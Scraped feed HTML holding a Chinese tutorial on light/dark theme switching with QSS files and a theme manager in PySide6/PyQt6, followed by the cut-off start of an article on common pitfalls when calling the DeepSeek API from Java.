itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            在PySide6/PyQt6的项目中实现样式切换处理
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/122769398839592/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    伍华聪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T04:19:25.000Z" title="Tue Dec 09 2025 04:19:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在桌面应用开发中，“主题切换（深色 / 浅色模式）”已经不再是锦上添花的功能，而是逐渐成为一种用户刚需。尤其对于长时间使用的 ERP 工具类应用来说，良好的视觉舒适度对用户体验影响巨大。本篇随笔针对PySide6/PyQt6的项目的实现案例，介绍如何实现样式切换处理。</p>
<p>Qt 官方本身提供了 <code>QStyle</code> 体系，但如果想做到：</p>
<ul>
<li>可自定义配色</li>
<li>可作为品牌皮肤</li>
<li>可热切换（无需重启）</li>
<li>多主题共存</li>
<li>可持久化</li>
</ul>
<p>那么，<strong>采用 QSS (Qt Style Sheet) + 统一主题管理器的方案无疑是目前最成熟、最实用、性价比最高的选择。</strong></p>
<p>本文将从 <strong>原理 → 架构设计 → 实现方式 → 最佳实践</strong> 四个维度，完整介绍在 PySide6 / PyQt6 项目中如何构建一套“企业级主题切换系统”。</p>
<h3 data-id="heading-0">一、为什么不能简单地用 <code>setStyle</code>？</h3>
<p>很多初学者在做样式适配时，都会走入一个误区：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">btn</span><span class="hljs-selector-class">.setStyleSheet</span>(<span class="hljs-string">"background:red"</span>)
<span class="hljs-selector-tag">table</span><span class="hljs-selector-class">.setStyleSheet</span>(<span class="hljs-string">"color:white"</span>)
...
</code></pre>
<p>这种写法短期“能用”，长期会带来三个严重问题：</p>
<ol>
<li>样式分散，难维护</li>
</ol>
<p>不同窗口、不同控件中的样式写法彼此独立，一个主题改动需要满项目搜索替换，很容易遗漏。</p>
<hr/>
<ol start="2">
<li>逻辑和表现混杂</li>
</ol>
<p>UI 逻辑代码被大量 CSS 淹没，维护成本剧增，违反基本的架构解耦原则。</p>
<hr/>
<ol start="3">
<li>无法进行主题切换</li>
</ol>
<p>没有分主题文件结构，一旦需要切换风格就必须“重写所有 setStyle”，几乎不可实现。</p>
<hr/>
<p>✅ 因此，<strong>如果项目规模超过 3 个界面，我们就必须放弃零散 setStyle 写法，转而使用 QSS 主题体系。</strong></p>
<h3 data-id="heading-1">二、什么是 QSS？</h3>
<p>Qt 中的 <strong>QSS (Qt Style Sheet)</strong>  本质和 CSS 非常类似，几乎可以视为 CSS 在 Qt 世界中的实现。</p>
<p>对 Qt 控件来说：</p>
<ul>
<li><code>QWidget</code> → HTML 标签</li>
<li><code>QPushButton</code>、<code>QTableView</code> → CSS 选择器</li>
<li><code>background / border / padding / color</code> → 样式属性</li>
</ul>
<p>例如：</p>
<pre><code class="hljs language-css" lang="css">QPushButton {
    <span class="hljs-attribute">background</span>: <span class="hljs-number">#3a3a3a</span>;
    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">6px</span>;
    <span class="hljs-attribute">color</span>: white;
}
</code></pre>
<p>QSS 能做到：</p>
<ul>
<li>全局覆盖</li>
<li>继承 &amp; 层级作用</li>
<li>精准控件控制</li>
<li>即时加载刷新</li>
</ul>
<p>我们希望做到：</p>
<blockquote>
<p><strong>业务代码永远不接触 CSS</strong><br/>
<strong>主题由独立模块统一调度</strong></p>
</blockquote>
<pre><code class="hljs language-css" lang="css">project/
│
├── <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.py</span>
├── core/
│   └── theme_manager<span class="hljs-selector-class">.py</span>
└── themes/
    ├── light<span class="hljs-selector-class">.qss</span>
    └── dark<span class="hljs-selector-class">.qss</span>
</code></pre>
<p>通过 ThemeManager 将 UI 层与样式层完全隔离，可读性和可维护性大幅提升。</p>
<p>我们需要一个负责三件事的主题管理器统一类：</p>
<ul>
<li>读取主题文件</li>
<li>调用 Qt API 应用主题</li>
<li>记录并恢复用户选择</li>
</ul>
<p>QSS 主题文件设计示例：以下是一个简化版本：</p>
<p>浅色主题</p>
<pre><code class="hljs language-css" lang="css">QWidget {
    <span class="hljs-attribute">background</span>: <span class="hljs-number">#ffffff</span>;
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#202020</span>;
}

QPushButton {
    <span class="hljs-attribute">background</span>: <span class="hljs-number">#e8e8e8</span>;
    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
}
</code></pre>
<p>深色主题</p>
<pre><code class="hljs language-css" lang="css">QWidget {
    <span class="hljs-attribute">background</span>: <span class="hljs-number">#2b2b2b</span>;
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#f0f0f0</span>;
}

QPushButton {
    <span class="hljs-attribute">background</span>: <span class="hljs-number">#3a3a3a</span>;
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#ffffff</span>;
}
</code></pre>
<h3 data-id="heading-2">三、UI 中的使用方式</h3>
<p>我们通过创建系统相关的菜单，如定义样式切换的菜单，然后绑定对应的菜单信号处理。</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">action_dark</span><span class="hljs-selector-class">.triggered</span><span class="hljs-selector-class">.connect</span>(<span class="hljs-attribute">lambda</span>: ThemeManager.<span class="hljs-built_in">apply</span>(<span class="hljs-string">"dark"</span>))
<span class="hljs-selector-tag">action_light</span><span class="hljs-selector-class">.triggered</span><span class="hljs-selector-class">.connect</span>(<span class="hljs-attribute">lambda</span>: ThemeManager.<span class="hljs-built_in">apply</span>(<span class="hljs-string">"light"</span>))
</code></pre>
<p>这样切换的时候，无需重启——Qt 会自动刷新全部控件。</p>
<p>通过样式管理器，实现不同主题演示的即时切换。</p>
<p><strong>主题系统并不是简单的“换几个颜色”。</strong></p>
<p>它是 UI 架构中不可忽视的一环：</p>
<ul>
<li>影响可维护性</li>
<li>决定代码整洁度</li>
<li>直接关系用户体验</li>
</ul>
<hr/>
<p>在 PySide6 / PyQt6 中，</p>
<blockquote>
<p><strong>QSS + ThemeManager + 动态切换 + 持久化</strong></p>
</blockquote>
<p>这一套组合，几乎是目前最成熟可靠的主题实现方案，没有之一。</p>
<p>真正的统一UI的样式，包含 5 个维度：</p>





























<table><thead><tr><th>维度</th><th>说明</th></tr></thead><tbody><tr><td>色板统一</td><td>背景色、主色、强调色、警示色</td></tr><tr><td>字体统一</td><td>字体家族、字号梯度</td></tr><tr><td>控件形态</td><td>圆角、border、padding</td></tr><tr><td>交互动效</td><td>hover、press、disable</td></tr><tr><td>布局密度</td><td>表格行距、控件间距</td></tr></tbody></table>
<h3 data-id="heading-3">四、具体在PySide6/PyQt6的项目中的实践过程</h3>
<p>我们根据前面的介绍，在项目目录中创建两个不同主题样式的文件，如下所示。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/239c06a219854f5392e2846ec50e74cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LyN5Y2O6IGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858764&amp;x-signature=tRIu6QEqRsbYB%2BtqvFHkEfa6Ohk%3D" alt="image" loading="lazy"/></p>
<p>然后根据样式的需要定义对应的相关内容，如下是浅色的主题定义，通过定义对应控件的颜色、字体、背景色等相关属性，实现统一的效果。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b89407e611640bb8969203a83f67751~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LyN5Y2O6IGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858764&amp;x-signature=mGe5yYtjnOavWZD%2BhP1sI4cUu4M%3D" alt="image" loading="lazy"/></p>
<p>通过辅助类，我们创建几个菜单来实现不同样式的切换。</p>
<pre><code class="hljs language-php" lang="php">        theme_menu = menu_bar.<span class="hljs-title function_ invoke__">addMenu</span>(<span class="hljs-string">"界面主题"</span>)
        light_action = ControlUtil.<span class="hljs-title function_ invoke__">create_menu</span>(
            <span class="hljs-built_in">self</span>, theme_menu, <span class="hljs-string">"浅色主题"</span>, <span class="hljs-string">"info"</span>
        )
        light_action.triggered.<span class="hljs-title function_ invoke__">connect</span>(<span class="hljs-attr">lambda</span>: <span class="hljs-built_in">self</span>.<span class="hljs-title function_ invoke__">set_theme</span>(<span class="hljs-number">1</span>))
        dark_action = ControlUtil.<span class="hljs-title function_ invoke__">create_menu</span>(
            <span class="hljs-built_in">self</span>, theme_menu, <span class="hljs-string">"深色主题"</span>, <span class="hljs-string">"info"</span>
        )
        dark_action.triggered.<span class="hljs-title function_ invoke__">connect</span>(<span class="hljs-attr">lambda</span>: <span class="hljs-built_in">self</span>.<span class="hljs-title function_ invoke__">set_theme</span>(<span class="hljs-number">2</span>))
        system_action = ControlUtil.<span class="hljs-title function_ invoke__">create_menu</span>(
            <span class="hljs-built_in">self</span>, theme_menu, <span class="hljs-string">"初始主题"</span>, <span class="hljs-string">"info"</span>
        )
        system_action.triggered.<span class="hljs-title function_ invoke__">connect</span>(<span class="hljs-attr">lambda</span>: <span class="hljs-built_in">self</span>.<span class="hljs-title function_ invoke__">set_theme</span>(<span class="hljs-number">0</span>))
</code></pre>
<p>菜单界面效果如下所示。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a0810ab1b284bb1a4af34ca41d69d04~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LyN5Y2O6IGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858764&amp;x-signature=0tdI52q0X8UUajcSdDBKncqnrJc%3D" alt="image" loading="lazy"/></p>
<p>其中样式的信号处理，我们通过一个单件的样式总线对象来处理。</p>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_theme</span>(<span class="hljs-params">self, theme_type</span>):
        <span class="hljs-string">"""设置主题颜色"""</span>
        self.theme_type = theme_type
        <span class="hljs-comment"># 切换主题颜色</span>
        ThemeBus().set_theme_type(self.theme_type)
</code></pre>
<p>其中，我们对样式总线对象的变化进行信号绑定处理。</p>
<pre><code class="hljs language-scss" lang="scss">        #监听主题变化的事件
        <span class="hljs-built_in">ThemeBus</span>()<span class="hljs-selector-class">.theme_type_changed</span><span class="hljs-selector-class">.connect</span>(self.on_theme_changed)
</code></pre>
<p>对主题样式的变化进行处理。</p>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">on_theme_changed</span>(<span class="hljs-params">self, theme_type</span>):
        <span class="hljs-string">"""主题变化的事件处理"""</span>
        
        theme_map = {
            <span class="hljs-number">1</span>: <span class="hljs-string">"light"</span>,
            <span class="hljs-number">2</span>: <span class="hljs-string">"dark"</span>,
            <span class="hljs-number">0</span>: <span class="hljs-string">""</span> <span class="hljs-comment">#不设置主题，默认使用系统主题</span>
        } 
        theme_name = theme_map[self.theme_type]

        self.log.info(<span class="hljs-string">f"主题变化: <span class="hljs-subst">{theme_type}</span>：<span class="hljs-subst">{theme_name}</span>"</span>)
        <span class="hljs-comment"># 切换主题颜色</span>
        ThemedHelper.apply(theme_type)
</code></pre>
<p>这个主题的辅助类，主要就是根据当前总线的样式值，加载对应的样式文件进行设置，如果为空，这还原为最初的默认样式。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThemedHelper</span>:
    <span class="hljs-string">"""控件主题辅助类"""</span>
 
<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">apply</span>(<span class="hljs-params">theme_type: <span class="hljs-built_in">int</span> = <span class="hljs-number">0</span></span>):
        <span class="hljs-string">"""应用主题样式"""</span>
        theme_name =  <span class="hljs-string">""</span>
        <span class="hljs-keyword">if</span> theme_type == <span class="hljs-number">1</span>:
            theme_name= <span class="hljs-string">"light"</span>
        <span class="hljs-keyword">elif</span> theme_type == <span class="hljs-number">2</span>:
            theme_name= <span class="hljs-string">"dark"</span> 
        <span class="hljs-keyword">else</span>:
            theme_name = <span class="hljs-string">""</span>
            
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> theme_name:
            qss = <span class="hljs-string">""</span> <span class="hljs-comment"># 自动主题， 无需加载 qss 文件</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f"app/themes/<span class="hljs-subst">{theme_name}</span>.qss"</span>, encoding=<span class="hljs-string">"utf8"</span>) <span class="hljs-keyword">as</span> f:
                qss = f.read()
        
        app : QApplication = QApplication.instance()
        <span class="hljs-keyword">if</span> app:
            app.setStyle(<span class="hljs-string">"Fusion"</span>)
            app.setStyleSheet(qss)
</code></pre>
<p>暗色主题的效果如下所示。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a1244d31efa4f278f5b8913cd461f73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LyN5Y2O6IGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858764&amp;x-signature=1JWUCHIyEMsTPezKk1IrV1LtPqc%3D" alt="image" loading="lazy"/></p>
<p> 如果不喜欢厚重的主题，我们也可以切换会原来的默认主题。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b1ba34154ee54ab88d8f8245075b7d7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LyN5Y2O6IGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858764&amp;x-signature=%2FOyO0Wju%2FhDXbQ3UUo8gOqN9Vls%3D" alt="image" loading="lazy"/></p>
<p>以上就是我们在定义不同主题，实现主题切换的过程，我们可以根据需要，定义更多有特色的主题样式，而具有统一效果的主题样式，我们可以通过AI的询问方式，获得完整的样式代码，从而构建个性化的效果。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java 调用 DeepSeek API 的 8 个高频坑]]></title>    <link>https://juejin.cn/post/7581423932613771304</link>    <guid>https://juejin.cn/post/7581423932613771304</guid>    <pubDate>2025-12-09T04:01:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581423932613771304" data-draft-id="7581437632854212648" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java 调用 DeepSeek API 的 8 个高频坑"/> <meta itemprop="keywords" content="后端,Java,人工智能"/> <meta itemprop="datePublished" content="2025-12-09T04:01:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员丘山"/> <meta itemprop="url" content="https://juejin.cn/user/272334615219629"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java 调用 DeepSeek API 的 8 个高频坑
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/272334615219629/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员丘山
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T04:01:54.000Z" title="Tue Dec 09 2025 04:01:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读18分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>现在大模型开发特别火，DeepSeek 因为中文理解好、反应快、还便宜，不少 Java 开发者都用它。但实际写代码的时候，好多人因为没搞懂 API 机制、Java 并发这些东西，踩了不少坑：Token 过期把服务搞挂、多线程调用数据乱了、长文本传进去直接报错……
结合项目的经验，把最常踩的 8 个坑拆明白，从为啥会踩坑、怎么解决，到能直接用的代码，全给你说明白，帮你顺顺利利把 DeepSeek 集成到项目里。</p>
<h2 data-id="heading-1">一、坑 1：Token 过期未处理，鉴权异常引发服务中断</h2>
<h3 data-id="heading-2">问题本质</h3>
<p>DeepSeek 的 Token 一般能用 30 天，好多人一开始就把 Token 写在代码里，根本没考虑过期的事。一旦 Token 过期，所有 API 调用全返回 401 鉴权失败，如果没做异常处理，就会直接导致依赖该接口的业务服务中断。更糟的是，有的代码连异常都不捕获，直接抛个运行时异常，把线程池堵死，最后服务都熔断了。</p>
<h3 data-id="heading-3">典型错误代码</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 错误示例：硬编码Token，无过期处理、无异常捕获</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeepSeekClient</span> {
    <span class="hljs-comment">// 写死的 Token，过期直接失效</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEEPSEEK_TOKEN</span> <span class="hljs-operator">=</span> <span class="hljs-string">"sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">API_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">"https://api.deepseek.com/v1/chat/completions"</span>;

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">callApi</span><span class="hljs-params">(String prompt)</span> {
        <span class="hljs-comment">// 直接拼 Token，不管过没过期</span>
        <span class="hljs-type">HttpHeaders</span> <span class="hljs-variable">headers</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeaders</span>();
        headers.set(<span class="hljs-string">"Authorization"</span>, <span class="hljs-string">"Bearer "</span> + DEEPSEEK_TOKEN);
        headers.setContentType(MediaType.APPLICATION_JSON);

        <span class="hljs-comment">// 拼请求体</span>
        Map&lt;String, Object&gt; requestBody = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        requestBody.put(<span class="hljs-string">"model"</span>, <span class="hljs-string">"deepseek-chat"</span>);
        requestBody.put(<span class="hljs-string">"messages"</span>, Collections.singletonList(
